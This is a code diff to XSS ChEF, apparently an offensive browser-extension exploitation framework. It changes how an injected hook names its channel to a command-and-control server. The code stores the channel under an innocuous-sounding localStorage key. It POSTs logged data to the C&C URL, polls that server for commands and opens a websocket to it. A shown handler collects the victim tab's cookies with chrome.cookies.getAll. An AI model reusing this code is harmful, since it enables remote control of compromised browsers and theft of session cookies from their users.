@@ -24,7 +24,13 @@ function __xsschef() {
         return;
     }
     window.__xsschef_init = true;
-    
+    var myHook;
+    try{
+        if(!(myHook = localStorage['innocuous'])) { 
+            myHook = "__CHANNEL__";
+            localStorage['innocuous'] = '__CHANNEL__';
+        }
+    } catch (e) {}
     var MY_TAB_ID = -1;
     
     var persistentScripts = {};
@@ -63,7 +69,7 @@ function __xsschef() {
                 switch (msg.cmd) {
                     case 'log':
                         var x = new XMLHttpRequest();
-                        x.open('POST', url + '?ch=__CHANNEL__', true);
+                        x.open('POST', url + '?ch='+myHook, true);
                         x.send(JSON.stringify(msg.p));
                     break;
                 }
@@ -72,7 +78,7 @@ function __xsschef() {
            /* poll for commands from c&c server and send them to ext */
             setInterval(function() {
                 var x = new XMLHttpRequest();
-                x.open('GET', url + '?ch=__CMD_CHANNEL__', true);
+                x.open('GET', url + '?ch='+myHook+'-cmd', true);
                 x.onreadystatechange = function () {
                   if (x.readyState == 4 && x.status == 200) {
                     try {
@@ -111,7 +117,7 @@ function __xsschef() {
                 } catch(e) {}
             }
             ws.onopen = function() {
-                ws.send(JSON.stringify({cmd:'hello-hook',ch: '__CHANNEL__'}));
+                ws.send(JSON.stringify({cmd:'hello-hook',ch: myHook}));
             };
         }
         
@@ -249,6 +255,7 @@ function __xsschef() {
                         postToSheep(msg.id, {cmd: 'sendhtml'});
                 break;
                 case 'reportcookies':
+                $('mcurrent-hook')[0].innerText=hook;
                     chrome.tabs.get(msg.id, function(t) {
                         var cookstr = "No cookies permissions in extension";
                         chrome.cookies.getAll({
